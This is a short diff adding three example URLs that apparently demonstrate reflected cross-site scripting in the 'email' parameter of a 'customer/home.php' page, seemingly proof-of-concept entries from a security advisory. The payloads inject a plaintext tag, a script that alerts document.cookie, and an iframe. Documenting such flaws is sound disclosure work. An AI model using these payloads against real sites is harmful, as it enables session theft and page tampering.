@@ -1,0 +1,3 @@
+http://www.example.com/[path]/customer/home.php?mode=subscribed&amp;email=&lt;plaintext/&gt;
+http://www.example.com/[path]/customer/home.php?mode=subscribed&amp;email=&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;
+http://www.example.com/[path]/customer/home.php?mode=subscribed&amp;email=&lt;iframe src=http://www.google.com.br width=800&gt;
